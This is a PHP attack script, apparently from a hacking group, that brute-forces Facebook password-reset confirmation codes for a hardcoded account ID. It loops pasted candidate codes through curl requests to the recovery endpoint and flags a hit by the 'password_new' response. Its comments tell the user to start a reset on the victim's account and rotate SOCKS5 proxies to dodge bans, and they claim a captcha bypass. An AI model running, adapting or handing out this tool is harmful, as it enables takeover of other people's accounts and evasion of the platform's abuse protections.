<? 
    /* 
        [+] Facebook Code Security Cracker  
        [+] Coded By : Mauritania Attacker 
        [+] GreetZ : All AnonGhost MemberZ
        [+] FuCk Priv888888888888888888888
		 
		
		~~HACKING IS ART OF EXPLOITATION~~
		
		<3 <3 <3 I'm not educated , I hate school , Hacking is my life xD !!!!!!!!!!!!!!!!!!!!!!!!!! <3 <3 <3
		
		// How to use: Restore your victim account and better choose the email option :p , and the rest is to use your mind \!/
		I suggest you to use an auto rotating proxy after each 2 minutes so you won't get banned :D , i've bypassed already the captcha 
		security and cookies ,so facebook won't let you try many attempts so proxy is the solution !
		
		you still can add a proxy socks v5 option in Curl only two lines :
		
		curl_setopt($ch, CURLOPT_PROXY, "proxy:port");           
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
    
	    You can edit my script and try to develop it more if you have some ideas you are free , but don't forget the Copyright wkwkwkwkwkwk xd <3
		
		Sharing is Caring \!/
		
		Sorry my english is bad and i'm lazy xD !
	*/ 
    
	@set_time_limit(0); 
    echo "<form method='POST'> 
    <title>Facebook Code Security Cracker > By Mauritania Attacker</title> 
    <p align='center'> 
    <img border='0' src='http://www.bubblews.com/assets/images/news/740959391_1392900678.png' width='444' height='298'></p> 
    <style> 
    /* Rounded Corners */ 
    #ghost { 
    border: 1px #765942; 
    border-radius: 10px; 
    height: 250px; 
    width: 200px; } 
    input {     
    /* INPUTS */ 
    border: 1px solid #765942; 
    border-radius: 10px; } 
    </style> 
    <center><font color='#006600' size='4' face='impact'>Facebook 0day Exploit Reset Code Priv8 By Mauritania Attacker</center>
	<center><textarea cols='10' rows='6' id='ghost' name='code'></textarea><br></center> 
    <p><center><input type='submit' value='Crack Reset Code' name='scan'><br><br></center></p>
    </form>"; 
    $user = explode("\r\n", $_POST['code']); 
    if($_POST['scan']) 
        { 
    foreach($user as $code) 
    { 
        // Curl Function ^_^
		$ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/recover/password?u=100009243335312&n={$code}"); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   
        curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/35.0.1916.114"); // change this with your real useragent infos (browser & version)
		
		$check = curl_exec($ch); 
        if(eregi("password_new", $check)) //Keyword Good Response ^_^
            { 
                echo "<font face='Tahoma' size='2' color='green'>{$code} => Facebook Confirmation Code Found ^_^ </font><br>"; 
            } 
            else 
            { 
                echo "<font face='Tahoma' size='2' color='red'>{$code} => Incorrect Code Trying More...</font><br>"; 
            } 
        curl_close($ch); 
    } 
        } 
		@system("del cookie.txt"); //Delete cookies command for win server.
	    @system("rm cookie.txt"); // Delete cookies command for linux server.
?>

